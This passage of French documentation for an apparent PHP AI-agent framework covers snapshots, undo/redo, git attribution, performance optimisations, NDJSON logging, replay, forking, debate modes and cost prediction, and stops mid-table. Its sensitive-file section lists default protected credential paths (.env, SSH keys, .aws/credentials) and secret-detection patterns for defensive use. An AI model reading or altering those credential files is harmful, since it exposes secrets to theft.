> Système d'instantanés par fichier avec instantanés par message à éviction LRU (100 max), rembobinage par message, statistiques de diff, héritage d'instantanés pour les fichiers non modifiés, pile d'annulation/rétablissement, attribution git et protection des fichiers sensibles.

### Vue d'ensemble

Le système d'historique de fichiers comporte quatre composants :

- **`FileSnapshotManager`** -- Moteur principal d'instantanés. Crée et restaure des instantanés par fichier, gère les instantanés par message avec éviction LRU (100 max), prend en charge le rembobinage par message et calcule les statistiques de diff.
- **`UndoRedoManager`** -- Pile d'annulation/rétablissement (100 max) pour les opérations sur les fichiers (création, modification, suppression, renommage).
- **`GitAttribution`** -- Ajoute l'attribution de co-auteur IA aux commits git, met en staging les fichiers et fournit des résumés de modifications.
- **`SensitiveFileProtection`** -- Bloque les opérations d'écriture/suppression sur les fichiers sensibles et détecte les secrets dans le contenu avant l'écriture.

### Utilisation

#### Création et restauration d'instantanés

```php
$manager = FileSnapshotManager::getInstance();

$snapshotId = $manager->createSnapshot('/path/to/file.php');
$success = $manager->restoreSnapshot($snapshotId);

// Instantanés par message et rembobinage
$manager->trackEdit('/path/to/file.php', 'msg-001');
$manager->makeMessageSnapshot('msg-001');
$changedPaths = $manager->rewindToMessage('msg-001');
```

#### Statistiques de diff

```php
$diff = $manager->getDiff('/path/to/file.php', $fromSnapshotId, $toSnapshotId);
$stats = $manager->getDiffStats('msg-001');
// DiffStats { filesChanged: [...], insertions: 15, deletions: 3 }
```

#### Annulation/Rétablissement

```php
$undoRedo = UndoRedoManager::getInstance();
$undoRedo->recordAction(FileAction::edit('/path/to/file.php', $afterSnapshotId, $beforeSnapshotId));
$undoRedo->recordAction(FileAction::create('/path/to/new.php', $content, $snapshotId));
$undoRedo->undo();
$undoRedo->redo();
```

| Type d'action | Annulation | Rétablissement |
|---------------|------------|----------------|
| `create` | Supprime le fichier | Restaure depuis l'instantané |
| `edit` | Restaure l'instantané précédent | Restaure l'instantané post-modification |
| `delete` | Restaure depuis l'instantané | Supprime à nouveau le fichier |
| `rename` | Renomme en arrière | Renomme en avant |

#### Attribution Git

```php
$git = GitAttribution::getInstance();

if ($git->isGitRepository()) {
    $git->createCommit(
        message: 'Add OAuth2 authentication',
        files: ['app/Http/Middleware/OAuth2.php', 'config/auth.php'],
        options: ['context' => 'Part of the auth upgrade', 'include_summary' => true],
    );
    // Inclut Co-Authored-By: SuperAgent AI <ai@superagent.local>
}
```

#### Protection des fichiers sensibles

```php
$protection = SensitiveFileProtection::getInstance();

$protection->isProtected('.env');                    // true
$protection->isProtected('app/Models/User.php');     // false

$result = $protection->checkOperation('write', '.env');
$result->allowed; // false

$secrets = $protection->detectSecrets('api_key=sk-1234567890abcdef');
// [['type' => 'api_key', 'pattern_matched' => true, 'position' => 0]]

$protection->addProtectedPattern('*.vault');
$protection->addProtectedFile('/path/to/specific/file.conf');
```

Les motifs protégés par défaut incluent : `*.env`, `.env.*`, `*.key`, `*.pem`, `*.p12`, `*.pfx`, `*_rsa`, `*_dsa`, `id_rsa*`, `.htpasswd`, `.npmrc`, `*.sqlite`, `*.db`, `secrets.*`, `credentials.*`, `auth.*`, `.ssh/*`, `.aws/credentials`, `.git/config`, et plus encore.

Motifs de détection de secrets : `api_key`, `aws_key`, `private_key` (en-têtes PEM), `token`/`bearer`, `password`, `database_url` (chaînes de connexion avec identifiants).

### Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| L'instantané renvoie null | Le fichier n'existe pas ou les instantanés sont désactivés | Vérifiez `file_exists()` et `isEnabled()` |
| Le rembobinage échoue | L'identifiant de message n'est pas dans la carte des instantanés | Vérifiez `canRewindToMessage()` d'abord |
| Anciens instantanés manquants | Éviction LRU | Augmentez `MAX_MESSAGE_SNAPSHOTS` (par défaut 100) |
| Écriture de fichier sensible bloquée | Le fichier correspond à un motif protégé | Supprimez le motif ou désactivez la protection pour les tests |
| Le commit git échoue | Pas de modifications en staging ou pas un dépôt git | Vérifiez `hasStagedChanges()` et `isGitRepository()` |
| L'annulation ne fonctionne pas | Aucun identifiant d'instantané enregistré | Assurez-vous d'appeler `createSnapshot()` avant et après les modifications |

---

## 24. Optimisation des Performances

> 13 stratégies configurables qui réduisent la consommation de tokens (30-50 %), diminuent les coûts (40-60 %), améliorent les taux de cache (~90 %) et accélèrent l'exécution des outils grâce au parallélisme.

### Vue d'ensemble

SuperAgent v0.7.0 introduit deux couches d'optimisation intégrées au pipeline `QueryEngine` :

- **Optimisations de Tokens** (`src/Optimization/`) — 5 stratégies qui réduisent les tokens d'entrée/sortie de l'API
- **Performance d'Exécution** (`src/Performance/`) — 8 stratégies qui accélèrent l'exécution à l'exécution

Toutes les optimisations sont initialisées automatiquement dans le constructeur de `QueryEngine` via `fromConfig()` et appliquées de manière transparente dans `callProvider()` et `executeTools()`. Chacune peut être désactivée indépendamment via des variables d'environnement.

### Configuration

```php
// config/superagent.php

'optimization' => [
    'tool_result_compaction' => [
        'enabled' => env('SUPERAGENT_OPT_TOOL_COMPACTION', true),
        'preserve_recent_turns' => 2,   // Conserver les N derniers tours intacts
        'max_result_length' => 200,     // Nombre max de caractères pour un résultat compacté
    ],
    'selective_tool_schema' => [
        'enabled' => env('SUPERAGENT_OPT_SELECTIVE_TOOLS', true),
        'max_tools' => 20,              // Nombre max d'outils à inclure par requête
    ],
    'model_routing' => [
        'enabled' => env('SUPERAGENT_OPT_MODEL_ROUTING', true),
        'fast_model' => env('SUPERAGENT_OPT_FAST_MODEL', 'claude-haiku-4-5-20251001'),
        'min_turns_before_downgrade' => 2,
    ],
    'response_prefill' => [
        'enabled' => env('SUPERAGENT_OPT_RESPONSE_PREFILL', true),
    ],
    'prompt_cache_pinning' => [
        'enabled' => env('SUPERAGENT_OPT_CACHE_PINNING', true),
        'min_static_length' => 500,
    ],
],

'performance' => [
    'parallel_tool_execution' => [
        'enabled' => env('SUPERAGENT_PERF_PARALLEL_TOOLS', true),
        'max_parallel' => 5,
    ],
    'streaming_tool_dispatch' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_DISPATCH', true),
    ],
    'connection_pool' => [
        'enabled' => env('SUPERAGENT_PERF_CONNECTION_POOL', true),
    ],
    'speculative_prefetch' => [
        'enabled' => env('SUPERAGENT_PERF_SPECULATIVE_PREFETCH', true),
        'max_cache_entries' => 50,
        'max_file_size' => 100000,
    ],
    'streaming_bash' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_BASH', true),
        'max_output_lines' => 500,
        'tail_lines' => 100,
        'stream_timeout_ms' => 30000,
    ],
    'adaptive_max_tokens' => [
        'enabled' => env('SUPERAGENT_PERF_ADAPTIVE_TOKENS', true),
        'tool_call_tokens' => 2048,
        'reasoning_tokens' => 8192,
    ],
    'batch_api' => [
        'enabled' => env('SUPERAGENT_PERF_BATCH_API', false),  // Désactivé par défaut
        'max_batch_size' => 100,
    ],
    'local_tool_zero_copy' => [
        'enabled' => env('SUPERAGENT_PERF_ZERO_COPY', true),
        'max_cache_size_mb' => 50,
    ],
],
```

### Optimisations de Tokens

#### Compaction des Résultats d'Outils (`ToolResultCompactor`)

Remplace les anciens résultats d'outils par des résumés concis. Les résultats au-delà des N derniers tours sont compactés en `"[Compacted] Read: <?php class Agent..."`. Les résultats d'erreur sont préservés intacts.

```php
use SuperAgent\Optimization\ToolResultCompactor;

$compactor = new ToolResultCompactor(
    enabled: true,
    preserveRecentTurns: 2,
    maxResultLength: 200,
);

// Compacter un tableau de messages (retourne un nouveau tableau, les originaux restent inchangés)
$compacted = $compactor->compact($messages);
```

**Impact** : Réduction de 30-50 % des tokens d'entrée dans les conversations multi-tours.

#### Schéma d'Outils Sélectif (`ToolSchemaFilter`)

Envoie uniquement les schémas d'outils pertinents par tour au lieu des 59. Détecte la phase de tâche en cours à partir de l'utilisation récente des outils :

| Phase | Détectée quand | Outils inclus |
|-------|---------------|---------------|
| Exploration | Le dernier outil était Read/Grep/Glob/WebSearch | read, grep, glob, bash, web_search, web_fetch |
| Édition | Le dernier outil était Edit/Write | read, write, edit, bash, grep, glob |
| Planification | Le dernier outil était Agent/PlanMode | read, grep, glob, agent, enter_plan_mode, exit_plan_mode |
| Premier tour | Pas d'historique d'outils | Tous les outils (pas de filtrage) |

Inclut toujours `read` et `bash`. Inclut également tout outil utilisé dans les 2 derniers tours. Seuil minimum de 5 outils — si le filtrage serait trop agressif, tous les outils passent.

**Impact** : ~10K tokens économisés par requête.

#### Routage de Modèle par Tour (`ModelRouter`)

Rétrograde automatiquement vers un modèle moins coûteux pour les tours d'appels d'outils purs (pas de texte, uniquement des blocs tool_use), et repasse automatiquement au modèle supérieur lorsque le modèle produit du texte substantiel.

```php
use SuperAgent\Optimization\ModelRouter;

$router = ModelRouter::fromConfig('claude-sonnet-4-6-20250627');

// Retourne le modèle rapide ou null (utiliser le modèle principal)
$model = $router->route($messages, $turnCount);

// Après chaque tour, enregistrer s'il s'agissait d'un tour uniquement d'outils
$router->recordTurn($assistantMessage);
```

Logique de routage :
1. Premiers N tours (par défaut 2) : toujours utiliser le modèle principal
2. Après 2+ tours consécutifs uniquement d'outils : rétrograder vers le modèle rapide
3. Quand le modèle rapide produit du texte : repasser automatiquement au modèle supérieur
4. Ne jamais rétrograder si le modèle principal est déjà un modèle économique (heuristique : le nom contient « haiku »)

**Impact** : Réduction des coûts de 40-60 %.

#### Préremplissage de Réponse (`ResponsePrefill`)

Utilise le préremplissage assistant d'Anthropic pour guider la sortie après des séquences prolongées d'appels d'outils. Après 3+ allers-retours consécutifs d'outils, prérempli avec `"I'll"` pour encourager la synthèse plutôt que d'autres appels d'outils. Stratégie conservatrice : pas de préremplissage au premier tour, après les résultats d'outils ou pendant l'exploration active.

#### Épinglage du Cache de Prompt (`PromptCachePinning`)

Insère automatiquement un marqueur de limite de cache dans les prompts système. Le `AnthropicProvider` divise le prompt à la limite : le contenu statique avant reçoit `cache_control: ephemeral`, le contenu dynamique après ne le reçoit pas. Cela permet la mise en cache du prompt : le préfixe statique reste en cache entre les tours.

Heuristiques de détection du point de séparation :
- Recherche des marqueurs de section dynamique : `# Current`, `# Context`, `# Memory`, `# Session`, `# Recent`, `# Task`
- Se rabat sur le point à 80 % si aucun marqueur n'est trouvé

**Impact** : Taux de cache de prompt d'environ 90 %.

### Performance d'Exécution

#### Exécution Parallèle d'Outils (`ParallelToolExecutor`)

Lorsque le LLM retourne plusieurs blocs tool_use en un seul tour, les outils en lecture seule s'exécutent en parallèle en utilisant les PHP Fibers.

```php
use SuperAgent\Performance\ParallelToolExecutor;

$executor = ParallelToolExecutor::fromConfig();
$classified = $executor->classify($toolBlocks);
// $classified = ['parallel' => [...lecture seule...], 'sequential' => [...écriture...]]

$results = $executor->executeParallel($classified['parallel'], function ($block) {
    return $this->executeSingleTool($block);
});
```

Lecture seule (sûrs pour le parallélisme) : `read`, `grep`, `glob`, `web_search`, `web_fetch`, `tool_search`, `task_list`, `task_get`

**Impact** : Temps d'un tour multi-outils : max(t1,t2,t3) au lieu de somme(t1+t2+t3).

#### Dispatch d'Outils en Streaming (`StreamingToolDispatch`)

Pré-exécute les outils en lecture seule dès que leur bloc tool_use est complet dans le flux SSE, avant que la réponse complète du LLM ne soit terminée.

#### Pool de Connexions HTTP (`ConnectionPool`)

Clients Guzzle partagés par URL de base avec keep-alive cURL, TCP_NODELAY et TCP_KEEPALIVE. Élimine les poignées de main TCP/TLS répétées.

```php
use SuperAgent\Performance\ConnectionPool;

$pool = ConnectionPool::fromConfig();
$client = $pool->getClient('https://api.anthropic.com/', [
    'x-api-key' => $apiKey,
    'anthropic-version' => '2023-06-01',
]);
```

#### Pré-lecture Spéculative (`SpeculativePrefetch`)

Après l'exécution d'un outil Read, prédit et pré-lit les fichiers associés en cache mémoire :
- Fichier source → fichiers de test (`tests/Unit/BarTest.php`, `tests/Feature/BarTest.php`)
- Fichier de test → fichier source
- Classe PHP → interfaces dans le même répertoire
- Fichiers du même répertoire avec un préfixe de nom similaire

Maximum 5 prédictions par lecture, cache LRU avec 50 entrées.

#### Exécuteur Bash en Streaming (`StreamingBashExecutor`)

Diffuse la sortie Bash avec troncature par délai d'attente. Les sorties longues retournent les N dernières lignes + un en-tête récapitulatif.

```php
use SuperAgent\Performance\StreamingBashExecutor;

$bash = StreamingBashExecutor::fromConfig();
$result = $bash->execute('npm test', '/path/to/project');
// $result = ['output' => '...', 'exit_code' => 0, 'truncated' => true, 'total_lines' => 1500]
```

#### max_tokens Adaptatif (`AdaptiveMaxTokens`)

Ajuste dynamiquement `max_tokens` par tour en fonction du type de réponse attendu :

| Contexte | max_tokens |
|----------|-----------|
| Premier tour | 8192 |
| Tour d'appels d'outils purs (pas de texte) | 2048 |
| Tour de raisonnement/texte | 8192 |

#### API Batch (`BatchApiClient`)

Met en file d'attente les requêtes non temps réel pour l'API Message Batches d'Anthropic (réduction de 50 % des coûts).

```php
use SuperAgent\Performance\BatchApiClient;

$batch = BatchApiClient::fromConfig();
$batch->queue('task-1', $requestBody1);
$batch->queue('task-2', $requestBody2);

$results = $batch->submitAndWait(timeoutSeconds: 300);
// $results = ['task-1' => [...], 'task-2' => [...]]
```

**Remarque** : Désactivé par défaut. Activez avec `SUPERAGENT_PERF_BATCH_API=true`.

#### Zéro-Copie d'Outils Locaux (`LocalToolZeroCopy`)

Cache de contenu de fichiers entre les outils Read/Edit/Write. Les résultats de Read sont mis en cache en mémoire, Edit/Write invalide le cache. Utilise une vérification d'intégrité md5 pour détecter les modifications externes.

```php
use SuperAgent\Performance\LocalToolZeroCopy;

$zc = LocalToolZeroCopy::fromConfig();
$zc->cacheFile('/src/Agent.php', $content);

// Prochain Read : vérifier le cache d'abord
$cached = $zc->getCachedFile('/src/Agent.php');

// Après Edit/Write : invalider
$zc->invalidateFile('/src/Agent.php');
```

### Désactivation de Toutes les Optimisations

```env
# Optimisations de tokens
SUPERAGENT_OPT_TOOL_COMPACTION=false
SUPERAGENT_OPT_SELECTIVE_TOOLS=false
SUPERAGENT_OPT_MODEL_ROUTING=false
SUPERAGENT_OPT_RESPONSE_PREFILL=false
SUPERAGENT_OPT_CACHE_PINNING=false

# Performance d'exécution
SUPERAGENT_PERF_PARALLEL_TOOLS=false
SUPERAGENT_PERF_STREAMING_DISPATCH=false
SUPERAGENT_PERF_CONNECTION_POOL=false
SUPERAGENT_PERF_SPECULATIVE_PREFETCH=false
SUPERAGENT_PERF_STREAMING_BASH=false
SUPERAGENT_PERF_ADAPTIVE_TOKENS=false
SUPERAGENT_PERF_BATCH_API=false
SUPERAGENT_PERF_ZERO_COPY=false
```

### Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| Le routage de modèle produit des erreurs | Le modèle rapide ne gère pas les outils complexes | Définissez `SUPERAGENT_OPT_MODEL_ROUTING=false` ou augmentez `min_turns_before_downgrade` |
| Résultats d'outils trop agressivement compactés | Contexte important perdu dans les anciens résultats | Augmentez `preserve_recent_turns` ou `max_result_length` |
| Les outils sélectifs suppriment un outil nécessaire | La détection de phase a mal classifié | L'outil utilisé dans les 2 derniers tours est toujours inclus ; augmentez `max_tools` |
| L'exécution parallèle cause des conflits de fichiers | Un outil d'écriture incorrectement classifié en lecture seule | Signalez le bogue — seuls `read`, `grep`, `glob`, `web_search`, `web_fetch`, `tool_search`, `task_list`, `task_get` sont sûrs pour le parallélisme |
| Le cache de pré-lecture est trop volumineux | Trop de fichiers en cache | Réduisez `max_cache_entries` ou `max_file_size` |
| Délai d'attente de l'API Batch | Le lot volumineux prend trop de temps | Augmentez le délai d'attente dans `submitAndWait()` ou réduisez la taille du lot |

---

## 25. Journalisation Structurée NDJSON

> Journalisation NDJSON (Newline Delimited JSON) compatible avec Claude Code pour la surveillance de processus en temps réel. Émet le même format d'événements que la sortie `stream-json` de CC.

### Vue d'ensemble

SuperAgent peut écrire des journaux d'exécution structurés au format NDJSON — un objet JSON par ligne, correspondant au protocole `stream-json` de Claude Code. Cela permet :

- **Visibilité du moniteur de processus** : des outils comme le bridge/sessionRunner de CC peuvent analyser le journal et afficher l'activité des outils en temps réel
- **Débogage** : transcription complète de l'exécution avec les appels d'outils, les résultats et l'utilisation de tokens
- **Rejeu** : les fichiers de journal peuvent être rejoués pour reconstruire le flux d'exécution

Deux composants :
- **`NdjsonWriter`** — Écrivain de bas niveau qui formate et émet des événements NDJSON individuels
- **`NdjsonStreamingHandler`** — Fabrique qui crée un `StreamingHandler` connecté à `NdjsonWriter`

### Types d'Événements

| Type | Rôle | Description |
|------|------|-------------|
| `assistant` | assistant | Réponse du LLM avec des blocs de contenu text et/ou tool_use + utilisation par tour |
| `user` | user | Résultat d'outil avec `parent_tool_use_id` défini |
| `result` | — | Résultat final d'exécution (succès ou erreur) |

### Utilisation

#### Rapide : En une ligne avec la fabrique StreamingHandler

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

// Créer un gestionnaire qui écrit du NDJSON dans un fichier de journal
$handler = NdjsonStreamingHandler::create(
    logTarget: '/tmp/agent-execution.jsonl',
    agentId: 'my-agent',
);

$result = $agent->prompt('Fix the bug in UserController', $handler);
```

#### Complet : Avec événements de résultat/erreur

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

$pair = NdjsonStreamingHandler::createWithWriter(
    logTarget: '/tmp/agent.jsonl',
    agentId: 'task-123',
    onText: function (string $delta, string $full) {
        echo $delta;  // Diffuser le texte vers le terminal
    },
);

try {
    $result = $agent->prompt($prompt, $pair->handler);

    $pair->writer->writeResult(
        numTurns: $result->turns(),
        resultText: $result->text(),
        usage: $result->totalUsage()->toArray(),
        costUsd: $result->totalCostUsd,
    );
} catch (\Throwable $e) {
    $pair->writer->writeError($e->getMessage());
    throw $e;
}
```

#### Bas niveau : NdjsonWriter direct

```php
use SuperAgent\Logging\NdjsonWriter;

$writer = new NdjsonWriter(
    agentId: 'agent-1',
    sessionId: 'session-abc',
    stream: fopen('/tmp/log.jsonl', 'a'),
);

// Écrire des événements individuels
$writer->writeToolUse('Read', 'tu_001', ['file_path' => '/src/Agent.php']);
$writer->writeToolResult('tu_001', 'Read', '<?php class Agent { ... }', false);
$writer->writeAssistant($assistantMessage);
$writer->writeResult(3, 'Task completed.', ['input_tokens' => 5000, 'output_tokens' => 1200]);
```

### Référence du Format NDJSON

#### Événement assistant (tool_use)
```json
{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"tu_001","name":"Read","input":{"file_path":"/src/Agent.php"}}]},"usage":{"inputTokens":1500,"outputTokens":200,"cacheReadInputTokens":0,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"a1b2c3d4-...","parent_tool_use_id":null}
```

#### Événement utilisateur (tool_result)
```json
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"tu_001","content":"<?php class Agent { ... }"}]},"parent_tool_use_id":"tu_001","session_id":"agent-1","uuid":"e5f6g7h8-..."}
```

#### Événement de résultat (succès)
```json
{"type":"result","subtype":"success","duration_ms":12345,"duration_api_ms":12345,"is_error":false,"num_turns":3,"result":"Task completed.","total_cost_usd":0.005,"usage":{"inputTokens":5000,"outputTokens":1200,"cacheReadInputTokens":800,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"i9j0k1l2-..."}
```

#### Événement de résultat (erreur)
```json
{"type":"result","subtype":"error_during_execution","duration_ms":500,"is_error":true,"num_turns":0,"errors":["Connection refused"],"session_id":"agent-1","uuid":"m3n4o5p6-..."}
```

### Intégration avec les Processus Enfants

Les processus d'agents enfants (`agent-runner.php`) émettent automatiquement du NDJSON sur stderr. Le `ProcessBackend::poll()` du parent détecte les lignes JSON (commençant par `{`) et les met en file d'attente comme événements de progression. `AgentTool::applyProgressEvents()` analyse à la fois le format NDJSON de CC et le format hérité `__PROGRESS__:` pour la rétrocompatibilité.

### Référence de l'API

#### `NdjsonWriter`

| Méthode | Description |
|---------|-------------|
| `writeAssistant(AssistantMessage, ?parentToolUseId)` | Émet un message assistant avec des blocs de contenu + utilisation |
| `writeToolUse(toolName, toolUseId, input)` | Émet un seul tool_use comme message assistant |
| `writeToolResult(toolUseId, toolName, result, isError)` | Émet un résultat d'outil comme message utilisateur |
| `writeResult(numTurns, resultText, usage, costUsd)` | Émet un résultat de succès |
| `writeError(error, subtype)` | Émet un résultat d'erreur |

#### `NdjsonStreamingHandler`

| Méthode | Description |
|---------|-------------|
| `create(logTarget, agentId, append, onText, onThinking)` | Retourne un `StreamingHandler` |
| `createWithWriter(logTarget, agentId, append, onText, onThinking)` | Retourne une paire `{handler, writer}` |

### Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| Le fichier de journal est vide | Le gestionnaire n'a pas été passé à `$agent->prompt()` | Assurez-vous que le gestionnaire est le second argument |
| Pas d'événements d'outils dans le journal | Seul `onText` a été enregistré | Utilisez `NdjsonStreamingHandler::create()` qui enregistre tous les callbacks |
| Le moniteur de processus n'affiche aucune activité | L'analyseur attend du NDJSON mais reçoit du texte brut | Vérifiez que le processus enfant utilise `NdjsonWriter` (v0.6.18+) |
| L'Unicode casse l'analyseur NDJSON | U+2028/U+2029 dans le contenu | `NdjsonWriter` échappe ces caractères automatiquement |

---

## 26. Replay d'Agent & Débogage Temporel

> Enregistrez les traces d'exécution complètes et rejouez-les pas à pas pour déboguer les interactions multi-agents complexes. Inspectez l'état d'un agent à n'importe quel moment, recherchez des événements, forkez depuis n'importe quel pas, et visualisez les timelines avec le coût cumulé.

### Aperçu

Le système Replay capture chaque événement significatif pendant l'exécution — appels LLM, appels d'outils, créations d'agents, messages inter-agents et snapshots d'état périodiques — dans une `ReplayTrace` immuable. Un `ReplayPlayer` vous permet de naviguer en avant/arrière, d'inspecter des agents individuels et de forker depuis n'importe quel pas.

Classes clés :

| Classe | Rôle |
|---|---|
| `ReplayRecorder` | Enregistre les événements pendant l'exécution |
| `ReplayTrace` | Trace immuable avec événements et métadonnées |
| `ReplayEvent` | Événement unique (5 types : llm_call, tool_call, agent_spawn, agent_message, state_snapshot) |
| `ReplayPlayer` | Navigation pas à pas, inspection, recherche, fork |
| `ReplayState` | État reconstruit à un pas spécifique |
| `ReplayStore` | Persistance NDJSON avec liste/nettoyage/suppression |

### Configuration

```php
'replay' => [
    'enabled' => env('SUPERAGENT_REPLAY_ENABLED', false),
    'storage_path' => env('SUPERAGENT_REPLAY_STORAGE_PATH', null),
    'snapshot_interval' => (int) env('SUPERAGENT_REPLAY_SNAPSHOT_INTERVAL', 5),
    'max_age_days' => (int) env('SUPERAGENT_REPLAY_MAX_AGE_DAYS', 30),
],
```

### Utilisation

```php
use SuperAgent\Replay\ReplayRecorder;
use SuperAgent\Replay\ReplayPlayer;
use SuperAgent\Replay\ReplayStore;

// Enregistrer les traces d'exécution
$recorder = new ReplayRecorder('session-123', snapshotInterval: 5);
$recorder->recordLlmCall('main', 'claude-sonnet-4-6', $messages, $response, $usage, $durationMs);
$recorder->recordToolCall('main', 'read', $toolId, $input, $output, $durationMs);
$recorder->recordAgentSpawn('child-1', 'main', 'researcher', $config);
$trace = $recorder->finalize();

// Charger et rejouer
$store = new ReplayStore(storage_path('superagent/replays'));
$store->save($trace);
$trace = $store->load('session-123');

$player = new ReplayPlayer($trace);
$state = $player->stepTo(15);       // Aller au pas 15
$info = $player->inspect('child-1'); // Inspecter l'état d'un agent enfant
$results = $player->search('bash');  // Rechercher des événements
$timeline = $player->getTimeline();  // Timeline formatée
$forked = $player->fork(10);        // Forker depuis le pas 10
```

### Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| Fichier de trace trop volumineux | Session longue | Augmentez `snapshot_interval` pour réduire la fréquence des snapshots |
| Événements manquants dans le replay | Recorder non connecté | Assurez-vous que `ReplayRecorder` est connecté au QueryEngine |

---

## 27. Fork de Conversation

> Branchez une conversation à n'importe quel point pour explorer plusieurs approches en parallèle, puis sélectionnez automatiquement le meilleur résultat avec des stratégies de scoring intégrées ou personnalisées.

### Aperçu

Le Fork de Conversation vous permet de prendre un snapshot de conversation, créer N branches avec différents prompts ou stratégies, les exécuter toutes en parallèle via `proc_open`, et choisir la meilleure. Idéal pour : comparer des approches de conception, A/B tester des prompts, explorer des variantes sous contraintes budgétaires.

Classes clés :

| Classe | Rôle |
|---|---|
| `ForkManager` | API de haut niveau pour créer et exécuter des forks |
| `ForkSession` | Session de fork avec messages de base et branches |
| `ForkBranch` | Branche unique avec prompt, statut, résultat, score |
| `ForkExecutor` | Exécution parallèle via `proc_open` |
| `ForkResult` | Résultats agrégés avec scoring et classement |
| `ForkScorer` | Stratégies de scoring intégrées |

### Configuration

```php
'fork' => [
    'enabled' => env('SUPERAGENT_FORK_ENABLED', false),
    'default_timeout' => (int) env('SUPERAGENT_FORK_TIMEOUT', 300),
    'max_branches' => (int) env('SUPERAGENT_FORK_MAX_BRANCHES', 5),
],
```

### Utilisation

```php
use SuperAgent\Fork\ForkManager;
use SuperAgent\Fork\ForkExecutor;
use SuperAgent\Fork\ForkScorer;

$manager = new ForkManager(new ForkExecutor());

// Différentes approches
$session = $manager->forkWithVariants(
    messages: $agent->getMessages(),
    turnCount: $currentTurn,
    prompts: ['Refactorer avec le pattern Strategy', 'Refactorer avec le pattern Command', 'Extraction de fonctions simple'],
);

$result = $manager->execute($session);

// Scoring composite : 70% efficacité coût + 30% brièveté
$scorer = ForkScorer::composite(
    [[ForkScorer::class, 'costEfficiency'], [ForkScorer::class, 'brevity']],
    [0.7, 0.3],
);
$best = $result->getBest($scorer);
```

### Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| Toutes les branches échouent | `agent-runner.php` introuvable | Vérifiez que `bin/agent-runner.php` existe et est exécutable |
| Branches en timeout | Tâche complexe + timeout court | Augmentez `fork.default_timeout` |

---

## 28. Protocole de Débat Agent

> Trois modes de collaboration multi-agents structurée — Débat, Red Team et Ensemble — qui améliorent la qualité des résultats par des approches adversariales ou indépendantes-puis-fusion.

### Aperçu

Le Protocole de Débat va au-delà de l'exécution parallèle simple en introduisant des patterns d'interaction structurée :

1. **Débat** : Un proposant argumente, un critique trouve les failles, un juge synthétise la meilleure approche. Plusieurs rounds avec réfutations.
2. **Red Team** : Un constructeur crée une solution, un attaquant trouve systématiquement les vulnérabilités, un réviseur produit l'évaluation finale.
3. **Ensemble** : N agents résolvent le même problème indépendamment, puis un fusionneur combine les meilleurs éléments.

### Configuration

```php
'debate' => [
    'enabled' => env('SUPERAGENT_DEBATE_ENABLED', false),
    'default_rounds' => (int) env('SUPERAGENT_DEBATE_ROUNDS', 3),
    'default_max_budget' => (float) env('SUPERAGENT_DEBATE_MAX_BUDGET', 5.0),
],
```

### Utilisation

```php
use SuperAgent\Debate\DebateOrchestrator;
use SuperAgent\Debate\DebateConfig;
use SuperAgent\Debate\RedTeamConfig;
use SuperAgent\Debate\EnsembleConfig;

$orchestrator = new DebateOrchestrator($agentRunner);

// Débat structuré
$config = DebateConfig::create()
    ->withProposerModel('opus')->withCriticModel('sonnet')->withJudgeModel('opus')
    ->withRounds(3)->withMaxBudget(5.0)
    ->withJudgingCriteria('Évaluer la correction, la maintenabilité et la performance');
$result = $orchestrator->debate($config, 'Microservices ou monolithe pour ce projet ?');

// Red Team sécurité
$config = RedTeamConfig::create()
    ->withAttackVectors(['security', 'edge_cases', 'race_conditions'])->withRounds(3);
$result = $orchestrator->redTeam($config, 'Construire un système d\'authentification JWT');

// Résolution ensemble
$config = EnsembleConfig::create()
    ->withAgentCount(3)->withModels(['opus', 'sonnet', 'haiku'])->withMergerModel('opus');
$result = $orchestrator->ensemble($config, 'Implémenter un rate limiter à fenêtre glissante');
```

### Dépannage

**Le débat coûte trop cher.** Utilisez `sonnet` pour le proposant/critique et `opus` uniquement pour le juge. Réduisez les rounds à 2. Définissez un `maxBudget` strict.

---

## 29. Moteur de Prédiction de Coûts

> Estimez le coût d'une tâche avant exécution en utilisant les données historiques et l'analyse de complexité du prompt. Comparez les coûts entre modèles instantanément.

### Aperçu

Le Moteur de Prédiction de Coûts analyse les prompts pour prédire l'utilisation de tokens, les tours nécessaires et le coût total. Trois stratégies par ordre de priorité : moyenne pondérée historique (confiance jusqu'à 95%), hybride type-moyenne (confiance jusqu'à 70%), heuristique (confiance 30%).

### Configuration

```php
'cost_prediction' => [
    'enabled' => env('SUPERAGENT_COST_PREDICTION_ENABLED', false),
    'storage_path' => env('SUPERAGENT_COST_PREDICTION_STORAGE_PATH', null),
],
```

### Utilisation

```php
use SuperAgent\CostPrediction\CostPredictor;
use SuperAgent\CostPrediction\CostHistoryStore;

$predictor = new CostPredictor(new CostHistoryStore(storage_path('superagent/cost_history')));

$estimate = $predictor->estimate('Refactorer tous les contrôleurs pour utiliser des DTOs', 'claude-sonnet-4-6');
echo $estimate->format();

if (!$estimate->isWithinBudget(1.00)) {
    $cheaper = $estimate->withModel('haiku');
}

// Comparaison multi-modèles
$comparison = $predictor->compareModels('Écrire les tests unitaires du UserService', ['opus', 'sonnet', 'haiku']);

// Enregistrer l'exécution réelle pour améliorer les prédictions futures
$predictor->recordExecution($taskHash, 'sonnet', $actualCost, $actualTokens, $actualTurns, $durationMs);
```

### Dépannage

**Les prédictions sont toujours « heuristiques » avec 30% de confiance.** Enregistrez les exécutions réelles via `recordExecution()`. Après 3+ tâches similaires, les prédictions passent en mode « historique ».

---

## 30. Garde-fous en Langage Naturel

> Définissez des règles de garde-fous en anglais simple. Compilation sans coût (pas d'appels LLM) via la correspondance de patterns déterministe.

### Aperçu

Les Garde-fous en Langage Naturel permettent aux parties prenantes non techniques de définir des règles de sécurité et de conformité sans apprendre le DSL YAML. Le `RuleParser` utilise des regex et la correspondance de mots-clés pour compiler des phrases en conditions de garde-fous standard. Il gère 6 types de règles :

| Type de règle | Exemple | Action compilée |
|---|---|---|
| Restriction d'outil | "Never modify files in database/migrations" | deny + tool_input_contains |
